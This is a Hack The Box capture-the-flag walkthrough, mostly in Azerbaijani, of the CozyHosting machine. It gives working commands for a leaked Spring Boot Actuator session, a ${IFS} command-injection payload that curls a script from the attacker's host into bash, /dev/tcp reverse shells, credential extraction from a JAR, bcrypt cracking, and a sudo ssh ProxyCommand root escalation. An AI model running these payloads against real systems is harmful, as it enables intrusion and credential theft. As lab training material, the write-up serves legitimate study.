# CozyHosting (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (nginx)
└── /etc/hosts: 10.129.229.88 cozyhosting.htb

İlkin Giriş (Spring Boot Actuator)
├── gobuster → /login, /admin (401), /logout, /error
├── ffuf (Java-Spring-Boot.txt) → /actuator, /actuator/sessions
├── /actuator/sessions → {"...":"kanderson"}
├── DevTools → JSESSIONID = kanderson → /admin
└── /actuator/mappings → POST /executessh

Command Injection (${IFS})
├── rev.sh: bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
└── shell as app

Giriş Məlumatlarının Sızması (JAR → PostgreSQL)
├── /app/cloudhosting-0.0.1.jar → BOOT-INF/classes/application.properties
│   └── postgres:<PASSWORD>
├── psql → SELECT * FROM users
│   └── admin:<BCRYPT_HASH>
└── hashcat -m 3200 → admin:<PASSWORD>

İstifadəçi Bayrağı (Password Reuse)
├── ssh josh@10.129.229.88 → <PASSWORD>
└── cat user.txt → <USER_FLAG>

Səlahiyyətlərin Artırılması (sudo ssh ProxyCommand)
├── sudo -l → (root) /usr/bin/ssh *
├── sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/... 0>&1"' x
└── root → cat /root/root.txt (<ROOT_FLAG>)
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Açıq Actuator, DB parolu olan JAR faylı, admin bcrypt heşi və LPE üçün `sudo ssh` ilə Spring Boot tətbiqi.

---

## Kəşfiyyat

```bash
nmap -p- --min-rate=5000 -T4 -oG - cozyhosting.htb | grep open
nmap -sC -sV -p 22,80 cozyhosting.htb
```

| Port | Xidmət | Versiya              |
|------|--------|----------------------|
| 22   | SSH    | OpenSSH 8.9p1 Ubuntu |
| 80   | HTTP   | nginx 1.18.0         |

```bash
echo "10.129.229.88    cozyhosting.htb" | sudo tee -a /etc/hosts
```

---

## İlkin Giriş

No CVE (custom vulnerability) - Spring Boot Actuator `/actuator/sessions` returns session IDs without authentication; the leaked admin session grants access to the panel, where the hostname field is vulnerable to OS command injection.

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

| Yol      | Status |
|----------|--------|
| /login   | 200    |
| /admin   | 401    |
| /logout  | 204    |
| /error   | 500    |

Spring Boot nümunəsi.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
ffuf -w ~/Java-Spring-Boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

Tapıldı: `/actuator/sessions`, `/actuator/env`, `/actuator/health`, `/actuator/mappings`, `/actuator/beans`.

```bash
curl -s http://cozyhosting.htb/actuator/sessions
```

```json
{"<SESSION_ID>":"kanderson"}
```

`JSESSIONID`-i əvəz edirik → `/admin`.

```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq
```

```
htb.cloudhosting.compliance.ComplianceService
executeOverSsh(String, String, HttpServletResponse)
POST /executessh
```

İstifadəçi adında boşluq filtri.

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.177/4444 0>&1' > rev.sh
python3 -m http.server 7000
nc -lvnp 4444
```

Payload:

```
test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

`app`-dan shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Giriş Məlumatlarının Sızması

```bash
ls /app
# cloudhosting-0.0.1.jar
unzip -d /tmp/app /app/cloudhosting-0.0.1.jar
cat /tmp/app/BOOT-INF/classes/application.properties
```

```
spring.datasource.username=postgres
spring.datasource.password=<PASSWORD>
```

```bash
psql -h 127.0.0.1 -U postgres
# password: <PASSWORD>
\connect cozyhosting
SELECT * FROM users;
```

```
kanderson | <BCRYPT_HASH> | User
admin     | <BCRYPT_HASH> | Admin
```

```bash
echo '<BCRYPT_HASH>' > hash_file
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

```bash
ssh josh@10.129.229.88
# password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Səlahiyyətlərin Artırılması

```bash
sudo -l
# User josh may run the following commands on localhost:
#     (root) /usr/bin/ssh *
```

```bash
nc -lvnp 5555
sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

`ssh` real SSH bağlantısından əvvəl `ProxyCommand`-ı icra edir - root hüquqları ilə.

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **Spring Boot Actuator** - `/actuator/sessions` avtorizasiya olmadan sessiya ID-lərini qaytarır.
- **`${IFS}` vasitəsilə Command Injection** - boşluq filtrinin yan keçməsi.
- **JAR-ın açılması** - `application.properties` tez-tez DB giriş məlumatlarını ehtiva edir.
- **PostgreSQL-də bcrypt heşləri** - hashcat mode 3200 vasitəsilə brute-force.
- **Parolun təkrar istifadəsi** - veb panel admininin parolu SSH ilə üst-üstə düşdü.
- **`sudo ssh` + `ProxyCommand`** - tam root shell-ə ekvivalent GTFOBins vektoru.
